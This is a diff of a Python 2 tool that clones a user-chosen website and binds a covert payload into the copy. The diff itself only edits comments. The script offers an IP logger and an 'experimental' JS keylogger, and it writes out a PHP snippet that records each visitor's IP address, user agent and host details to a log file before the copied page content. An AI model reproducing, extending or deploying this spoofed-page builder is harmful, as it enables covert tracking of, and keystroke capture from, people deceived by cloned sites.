@@ -13,15 +13,15 @@ import urllib
 import time
 import os
 
-# Check if old file (spoofed.html) exists 
+# check if old file (spoofed.html) exists 
 fileName = 'spoofed.html'
 checkIfExist = os.path.isfile(fileName)
 
-# Create spoofed.html if not exist
+# create spoofed.html if not exist
 if checkIfExist == 0:
     open(fileName, "w")
 
-#Delete spoofed.html if exist (has old data as backup)
+# delete spoofed.html if exist (has old data as backup)
 if checkIfExist == 1:
     os.remove(fileName)
     
@@ -30,26 +30,26 @@ print 'Enter website url to spoof e.g (http://google.com)\n'
 url = raw_input()
 print "\n"
 
-# Download the website files
+# download the website files (code for now)
 os.system("cls") 
 print 'Spoofing '+ url + ', this may take a few'
 urllib.urlretrieve (url, fileName)
 
-# Tell the user we finished
+# tell the user we finished
 print 'Download completed\n\n'
 
-# Store downloaded website content in spoofed.html
+# store downloaded website content in spoofed.html
 fileOpen = open(fileName, 'r')
 fileContent = fileOpen.read()
 fileOpen.close()
 
-# Choose what payloads to add to new webpage
+# choose what payloads to add to new webpage
 print 'Enter corresponding key to add payload:'
 print '[1] Add ip logger'
 print '[2] Add JS Keylogger (EXPERMIENTAL)'
 payload = raw_input()
 
-# Ip logger payload
+# ip logger payload
 if payload == '1':
     ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
     print '\nCreate new name for file: eg. (google)\n'
@@ -57,12 +57,12 @@ if payload == '1':
     print '\nBinding an ip logger to ' + newFileName
     
     makePage = open (newFileName, 'a') ## a will append, w will over-write
-    makePage.write(ipLogger)           ## 
-    makePage.write(fileContent)
-    makePage.close()
+    makePage.write(ipLogger)           ## write the ip logger module
+    makePage.write(fileContent)		   ## write downloaded html/php code
+    makePage.close()				   ## discontinue editing of file
     print '\nBound payload(s) successfully! Exiting in 4 seconds...'
     os.remove(fileName)
-    time.sleep(4)
+    time.sleep(4)					   ## give user time to read
 
 # else
     #print 'Payload(s) failed to be bound! Exiting in 4 seconds...'
